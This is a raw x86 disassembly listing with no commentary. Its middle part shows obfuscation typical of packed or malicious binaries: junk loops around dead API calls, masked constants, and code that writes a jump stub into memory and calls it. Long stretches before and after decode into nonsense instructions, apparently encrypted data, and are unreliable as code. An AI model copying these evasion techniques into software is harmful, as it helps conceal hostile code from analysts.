  41b7db:	and    al,BYTE PTR [ebp+0x967e00f]
  41b7e1:	pop    edx
  41b7e2:	add    bl,al
  41b7e4:	ret    
  41b7e5:	iret   
  41b7e6:	mov    DWORD PTR [esi],0x9c33fd75
  41b7ec:	cmp    eax,0x454b4505
  41b7f1:	sbb    DWORD PTR [ebx+0x4336be7b],esp
  41b7f7:	lea    edx,ds:0x945f764a
  41b7fd:	push   ebx
  41b7fe:	mov    ch,0xdb
  41b800:	dec    eax
  41b801:	inc    ebp
  41b802:	mov    WORD PTR [ecx],ds
  41b804:	pop    ss
  41b805:	xchg   DWORD PTR [ebp+0x73],esi
  41b808:	or     al,0xf5
  41b80a:	cmp    edi,esi
  41b80c:	sbb    eax,0xb2ab0e20
  41b811:	jbe    0x41b7d6
  41b813:	test   BYTE PTR [esi],dh
  41b815:	cmc    
  41b816:	dec    edx
  41b817:	inc    ebx
  41b818:	dec    esi
  41b819:	lds    edx,FWORD PTR [eax+0x17]
  41b81c:	xchg   BYTE PTR [esi-0x30eb9d5c],bh
  41b822:	je     0x41b83c
  41b824:	pop    ecx
  41b825:	jp     0x41b88e
  41b827:	xor    esi,edi
  41b829:	in     eax,dx
  41b82a:	push   edx
  41b82b:	cdq    
  41b82c:	clc    
  41b82d:	js     0x41b844
  41b82f:	cmp    BYTE PTR [eax-0x33],al
  41b832:	repnz rcl DWORD PTR [eax+0x41a82e5b],1
  41b839:	(bad)  
  41b83a:	jmp    0x7aaf:0xd6127b7c
  41b841:	jne    0x41b824
  41b843:	loop   0x41b835
  41b845:	fwait
  41b846:	pusha  
  41b847:	pop    esp
  41b848:	dec    edx
  41b849:	fidiv  DWORD PTR [esi]
  41b84b:	(bad)  
  41b84c:	dec    BYTE PTR [ebx+0x2581fc4d]
  41b852:	ret    
  41b853:	mov    es,WORD PTR [edx+0x0]
  41b856:	in     al,dx
  41b857:	xor    al,BYTE PTR [eax]
  41b859:	add    BYTE PTR [ebx],ch
  41b85b:	ror    DWORD PTR [ecx+0x581fc45],0x6b
  41b862:	mov    es,WORD PTR [edx+0x0]
  41b865:	aad    0x1d
  41b867:	add    BYTE PTR [eax],al
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292cf
  41b9ab:	mov    esi,DWORD PTR ds:0x429bc7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42aa1f
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42aa23
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42aa27
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42aa2b
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42aa2f
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9fb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9ff
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42aa03
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	add    eax,0x2780eb87
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0x42
  41bd5f:	inc    esp
  41bd60:	sub    BYTE PTR [esi+0x2aae0b5],cl
  41bd66:	jns    0x41bd60
  41bd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd69:	lods   eax,DWORD PTR ds:[esi]
  41bd6a:	mov    bh,0xf0
  41bd6c:	clc    
  41bd6d:	or     DWORD PTR [ebx-0x62],esi
  41bd70:	sahf   
  41bd71:	or     edx,ebx
  41bd73:	xchg   edi,eax
  41bd74:	stos   DWORD PTR es:[edi],eax
  41bd75:	xchg   BYTE PTR [ecx-0x28],bl
  41bd78:	lea    eax,[eax+0x283f735e]
  41bd7e:	mov    ebp,0x1b9b0cfc
  41bd83:	cmp    BYTE PTR [esi],dl
  41bd85:	(bad)  
  41bd86:	mov    al,ds:0xc8e812cd
  41bd8b:	sub    al,0x60
  41bd8d:	mov    cl,0x5b
  41bd8f:	sar    DWORD PTR [esi+ebx*1-0x2],0x34
  41bd94:	icebp  
  41bd95:	in     al,0xf5
  41bd97:	out    0x90,al
  41bd99:	mov    al,0x9f
  41bd9b:	aam    0x2a
  41bd9d:	out    dx,eax
  41bd9e:	fstp   DWORD PTR [esi+0x48b0da08]
  41bda4:	xor    eax,0x76daf19
  41bda9:	sbb    DWORD PTR ds:0x4efa4fa1,0xffffffc3
  41bdb0:	les    eax,FWORD PTR [eax]
  41bdb2:	xor    BYTE PTR es:[ebx],ch
  41bdb5:	das    
  41bdb6:	dec    edi
  41bdb7:	adc    eax,0xb6c01552
  41bdbc:	fwait
  41bdbd:	fs cld 
  41bdbf:	or     esi,ebp
  41bdc1:	aas    
  41bdc2:	ror    DWORD PTR [edx-0x8],1
  41bdc5:	popf   
  41bdc6:	das    
  41bdc7:	mov    gs,WORD PTR [eax]
  41bdc9:	(bad)  
  41bdca:	or     eax,DWORD PTR [ebp-0x41daae95]
  41bdd0:	in     eax,dx
  41bdd1:	enter  0x542c,0x9b
  41bdd5:	add    bh,BYTE PTR [edi]
  41bdd7:	inc    ebp
  41bdd8:	add    al,0xc3
  41bdda:	test   al,0x15
  41bddc:	sub    BYTE PTR [ebp-0x22],0x4
  41bde0:	sbb    al,0x5d
  41bde2:	mov    esp,0x2c278fe2
  41bde7:	push   0xffffffd6
  41bde9:	xchg   edi,eax
  41bdea:	popf   
  41bdeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdec:	outs   dx,BYTE PTR ds:[esi]
  41bded:	push   0xfffffff3
  41bdef:	into   
  41bdf0:	(bad)
  41bdf4:	(bad)  fs:[eax]
  41bdf7:	sahf   
  41bdf8:	(bad)  
  41bdf9:	inc    ebx
  41bdfa:	out    0x6e,al
  41bdfc:	loop   0x41bd95
  41bdfe:	xor    al,0x2a
  41be00:	gs cwde 
  41be02:	pop    esi
  41be03:	adc    BYTE PTR [ecx],0x59
  41be06:	adc    BYTE PTR [ebx],al
  41be08:	iret   
  41be09:	retf   
  41be0a:	idiv   BYTE PTR [esi]
  41be0c:	call   0x99bf:0x743a7e0
  41be13:	or     al,0xb0
  41be15:	push   ss
  41be16:	inc    ecx
  41be17:	push   0xffffffdb
  41be19:	fcmovb st,st(1)
  41be1b:	cmp    al,0x61
  41be1d:	fsubr  st(0),st
  41be1f:	xor    eax,0x80fb4ac1
  41be24:	dec    ebx
  41be25:	cmp    BYTE PTR [esi+0xcb3e927],0xcd
  41be2c:	adc    DWORD PTR [ebx],ebx
  41be2e:	in     eax,0xb5
  41be30:	xchg   ebx,eax
  41be31:	repz xor eax,0x2110e1e3
  41be37:	sahf   
  41be38:	fdivr  DWORD PTR [ebp+eiz*8-0x391c184a]
  41be3f:	pop    ebx
  41be40:	in     eax,0x1b
  41be42:	lods   eax,DWORD PTR ds:[esi]
  41be43:	scas   al,BYTE PTR es:[edi]
  41be44:	leave  
  41be45:	(bad)  
  41be46:	cld    
  41be47:	scas   al,BYTE PTR es:[edi]
  41be48:	sbb    cl,BYTE PTR [esi-0x5c4ccc9f]
  41be4e:	or     al,0x1a
  41be50:	mov    dh,0xfe
  41be52:	mov    esi,0x3e49c50e
  41be57:	outs   dx,BYTE PTR ds:[esi]
  41be58:	push   ds
  41be59:	jo     0x41beb9
  41be5b:	or     ah,BYTE PTR [edx]
  41be5d:	and    BYTE PTR [esi+0x6d],al
  41be60:	push   ebp
  41be61:	hlt    
  41be62:	pusha  
  41be63:	cmp    ebx,DWORD PTR [eax+0x73]
  41be66:	or     ah,BYTE PTR [eax+ebx*1+0x36]
  41be6a:	and    bl,BYTE PTR [edi]
  41be6c:	fs ins BYTE PTR es:[edi],dx
  41be6e:	sbb    DWORD PTR [edx+0x7e],edx
  41be71:	xlat   BYTE PTR ds:[ebx]
  41be72:	mov    ecx,0xe1acc9e
  41be77:	xchg   ecx,eax
  41be78:	ins    BYTE PTR es:[edi],dx
  41be79:	adc    DWORD PTR [ebp+0xb286b50],edx
  41be7f:	adc    al,0xd5
  41be81:	loop   0x41be60
  41be83:	push   ebx
  41be84:	pushf  
  41be85:	int    0x6e
  41be87:	adc    BYTE PTR [esi-0xc],ah
  41be8a:	and    eax,0x7ea91e09
  41be8f:	jmp    0x911ed0a5
  41be94:	mov    dl,0x8
  41be96:	jb     0x41bef9
  41be98:	or     eax,0x412e7d58
  41be9d:	inc    ecx
  41be9e:	jbe    0x41bed6
  41bea0:	in     al,dx
  41bea1:	test   al,0xd1
  41bea3:	mov    edi,0x6c52927d
  41bea8:	push   esp
  41bea9:	fsub   DWORD PTR [edi+0x5d]
  41beac:	sub    esp,DWORD PTR gs:[eax-0x110db05f]
  41beb3:	les    eax,FWORD PTR [esi+0x697a8fbc]
  41beb9:	xor    edi,DWORD PTR [esp+edx*4-0x6d]
  41bebd:	jle    0x41be8f
  41bebf:	jns    0x41bebc
  41bec1:	repnz add esi,DWORD PTR [edx+edi*2-0x4307ebae]
  41bec9:	or     cl,BYTE PTR [edx+0x5196bea]
  41becf:	or     DWORD PTR [edi+0x4a],edx
  41bed2:	and    ecx,DWORD PTR [esi-0x17]
  41bed5:	mov    bh,0x5c
  41bed7:	int3   
  41bed8:	in     eax,0x33
  41beda:	jnp    0x41bf32
  41bedc:	add    ch,ah
  41bede:	iret   
  41bedf:	div    BYTE PTR [ecx]
  41bee1:	mov    bl,BYTE PTR [edx+0x70]
  41bee4:	mov    ds:0x23990cc1,eax
  41bee9:	popa   
  41beea:	(bad)  
  41beeb:	popf   
  41beec:	mov    ah,0xcd
  41beee:	pop    edi
  41beef:	inc    ebp
  41bef0:	callw  0x2a8f
  41bef4:	xor    DWORD PTR [esi],ecx
  41bef6:	call   0xecca7eb8
  41befb:	cld    
  41befc:	repz std 
  41befe:	dec    ecx
  41beff:	mov    eax,0xe6f03643
  41bf04:	jecxz  0x41bf7c
  41bf06:	jae    0x41be92
  41bf08:	cmp    ch,BYTE PTR [ecx-0x45]
  41bf0b:	jbe    0x41beb9
  41bf0d:	jne    0x41beaa
  41bf0f:	jo     0x41bea0
  41bf11:	pop    ss
  41bf12:	je     0x41bf55
  41bf14:	and    cl,ch
  41bf16:	mov    edi,0x5f5866e
  41bf1b:	jmp    0x33d73c44
  41bf20:	xchg   ecx,eax
  41bf21:	jmp    0x8f38cabe
  41bf26:	or     DWORD PTR [esi-0x3f],ecx
  41bf29:	cwde   
  41bf2a:	inc    ecx
  41bf2b:	and    BYTE PTR [edi+0x5c],bh
  41bf2e:	inc    edi
  41bf2f:	popf   
  41bf30:	pop    ebp
  41bf31:	or     ah,BYTE PTR [ebx]
  41bf33:	or     eax,0x4dbda4d2
  41bf38:	mov    bl,0xaf
  41bf3a:	aas    
  41bf3b:	repnz pop ss
  41bf3d:	xor    edi,DWORD PTR [ebx-0x26579841]
  41bf43:	push   esp
  41bf44:	fidiv  DWORD PTR [esi+0x7d]
  41bf47:	mov    dl,BYTE PTR [esi+0x5a]
  41bf4a:	out    0x85,al
  41bf4c:	popf   
  41bf4d:	and    ebp,esp
  41bf4f:	pop    ss
  41bf50:	push   ebx
  41bf51:	loopne 0x41beff
  41bf53:	ins    DWORD PTR es:[edi],dx
  41bf54:	cli    
  41bf55:	jle    0x41bee7
  41bf57:	les    ebx,FWORD PTR [ebx]
  41bf59:	mov    dl,0xe2
  41bf5b:	sbb    al,0x8
  41bf5d:	mov    dl,0x78
  41bf5f:	push   ebp
  41bf60:	cmp    eax,0x5fff6b8e
  41bf65:	retf   0x1cc2
  41bf68:	ss jge 0x41bf7b
  41bf6b:	push   ss
  41bf6c:	jns    0x41bfa1
  41bf6e:	rcl    BYTE PTR [esi+0x45],0x94
  41bf72:	xchg   esp,eax
  41bf73:	inc    esp
  41bf74:	repz push esp
  41bf76:	dec    esi
  41bf77:	or     dh,BYTE PTR [ebp+0xb112205]
  41bf7d:	stos   DWORD PTR es:[edi],eax
  41bf7e:	mov    dh,BYTE PTR [ecx-0x7eee8f6c]
  41bf84:	and    DWORD PTR [edi-0x770f5ee5],ebx
  41bf8a:	and    al,0x4d
  41bf8c:	add    ebx,DWORD PTR [ebx]
  41bf8e:	bound  edi,QWORD PTR [ebp-0x2d]
  41bf91:	addr16 call 0x318c9a1c
  41bf97:	mov    ds:0x63d519d1,eax
  41bf9c:	add    esi,DWORD PTR [edx]
  41bf9e:	cmc    
  41bf9f:	jmp    0x6e70:0x5a642e7b
  41bfa6:	push   ds
  41bfa7:	mov    ah,0x7e
  41bfa9:	xchg   ebx,eax
  41bfaa:	inc    ax
  41bfac:	scas   al,BYTE PTR es:[edi]
  41bfad:	pusha  
  41bfae:	fld    QWORD PTR ds:0x23d3f57a
  41bfb4:	inc    BYTE PTR [esi]
  41bfb6:	sti    
  41bfb7:	xchg   ebp,eax
  41bfb8:	popa   
  41bfb9:	scas   al,BYTE PTR es:[edi]
  41bfba:	pop    ss
  41bfbb:	loop   0x41bfa7
  41bfbd:	popaw  
  41bfbf:	jge    0x41c022
  41bfc1:	popf   
  41bfc2:	call   0x2ad33c80
  41bfc7:	mov    dh,0x18
  41bfc9:	ss push edi
  41bfcb:	out    dx,eax
  41bfcc:	mov    bl,0x82
  41bfce:	lock outs dx,BYTE PTR ds:[esi]
  41bfd0:	inc    edi
  41bfd1:	jecxz  0x41c03e
  41bfd3:	ja     0x41c03b
  41bfd5:	test   eax,0x1a19ddd1
  41bfda:	aam    0xcd
  41bfdc:	adc    DWORD PTR [eax+0x6e],esp
  41bfdf:	ss xchg ebx,eax
  41bfe1:	push   ds
  41bfe2:	mov    WORD PTR [ecx+0x5ad91061],es
  41bfe8:	out    dx,al
  41bfe9:	fld    DWORD PTR [esi+0x411d65f8]
  41bfef:	arpl   WORD PTR [edi-0x35],sp
  41bff2:	rcr    DWORD PTR [eax-0x2c],0x53
  41bff6:	xchg   DWORD PTR [edx+eiz*4+0x36],esi
  41bffa:	ret    
  41bffb:	inc    esi
  41bffc:	mov    cl,0xbd
  41bffe:	pop    esp
  41bfff:	lock cmovl eax,DWORD PTR [esi]
  41c003:	fisubr DWORD PTR [ebp-0x3f]
  41c006:	cmp    DWORD PTR [edi+edi*2],ebp
  41c009:	psubusw mm5,QWORD PTR ds:0x50b3e413
  41c010:	(bad)  
  41c011:	sbb    BYTE PTR [edi+0x7d],bl
  41c014:	jae    0x41bfb0
  41c016:	xchg   edx,eax
  41c017:	outs   dx,DWORD PTR ds:[esi]
  41c018:	cmp    ch,BYTE PTR [esi+0x11a0b6c0]
  41c01e:	jno    0x41bfe0
  41c020:	in     eax,0x1a
  41c022:	xor    al,0xe5
  41c024:	sub    al,dh
  41c026:	div    BYTE PTR [edx-0x6a]
  41c029:	mov    al,0x48
  41c02b:	or     eax,0xc352fd17
  41c030:	cmc    
  41c031:	in     al,0x6e
  41c033:	xor    al,0x92
  41c035:	mov    ecx,0x7109bad8
  41c03a:	cdq    
  41c03b:	fmul   QWORD PTR [ecx]
  41c03d:	pop    edi
  41c03e:	dec    ebx
  41c03f:	repz mov esp,0x7dc5cabb
  41c045:	cmp    al,0x37
  41c047:	inc    esi
  41c048:	out    0x69,al
  41c04a:	jmp    0x692bdcd5
  41c04f:	sahf   
  41c050:	sub    eax,0x3034f40
  41c055:	fldcw  WORD PTR [edx]
  41c057:	mov    ebx,0xe7290710
  41c05c:	aam    0x81
  41c05e:	cmp    eax,0x791d9407
  41c063:	or     BYTE PTR [ebp+0x60],cl
  41c066:	xchg   edx,eax
  41c067:	mov    bh,0x9
  41c069:	mov    bl,dh
  41c06b:	ret    0x2985
  41c06e:	(bad)  
  41c06f:	sub    BYTE PTR [edx+0x6152ceed],al
  41c075:	jp     0x41c011
  41c077:	pop    ebp
  41c078:	int    0xd6
  41c07a:	loop   0x41c074
  41c07c:	xor    ebp,DWORD PTR [esi-0x20]
  41c07f:	test   al,0x45
  41c081:	dec    esp
  41c082:	iret   
  41c083:	mov    cl,0xb
  41c085:	pushf  
  41c086:	hlt    
  41c087:	mov    esp,0x3842aaac
  41c08c:	inc    edx
  41c08d:	jmp    DWORD PTR [ecx+0x3e17b03f]
  41c093:	clc    
  41c094:	cmp    BYTE PTR [edi-0x6b67284],dl
  41c09a:	(bad)  
  41c09b:	out    dx,eax
  41c09c:	lds    edx,FWORD PTR [edi+0x49776562]
  41c0a2:	sahf   
  41c0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a4:	test   edx,esp
  41c0a6:	mov    ch,0x3a
  41c0a8:	cmp    DWORD PTR [esi-0x2c2c8aa],eax
  41c0ae:	shl    BYTE PTR [edx-0x67],0xfd
  41c0b2:	or     al,0x52
  41c0b4:	test   eax,0xf940a350
  41c0b9:	jae    0x41c089
  41c0bb:	test   BYTE PTR [edx+0x56],al
  41c0be:	out    0x4a,eax
  41c0c0:	push   ss
  41c0c1:	mov    ds:0x9fb8b702,eax
  41c0c6:	iret   
  41c0c7:	pop    ecx
  41c0c8:	xchg   ebp,eax
  41c0c9:	adc    eax,0xf11d022
  41c0ce:	jne    0x41c0cf
  41c0d0:	fmul   QWORD PTR [edi+ebx*2-0x63b8837f]
  41c0d7:	daa    
  41c0d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0d9:	adc    al,BYTE PTR [esi-0x3160c9e9]
  41c0df:	test   BYTE PTR [esi+eax*4+0x5a9e6873],0xba
  41c0e7:	(bad)  
  41c0e8:	dec    esi
  41c0ea:	div    BYTE PTR [ebx+0x5]
  41c0ed:	fiadd  WORD PTR ds:0x603688f5
  41c0f3:	in     al,0x7d
  41c0f5:	mov    bl,0xec
  41c0f7:	ret    
  41c0f8:	pushf  
  41c0f9:	lods   eax,DWORD PTR ds:[esi]
  41c0fa:	or     al,0x52
  41c0fc:	dec    edx
  41c0fd:	stc    
  41c0fe:	xchg   ecx,eax
  41c0ff:	jb     0x41c12c
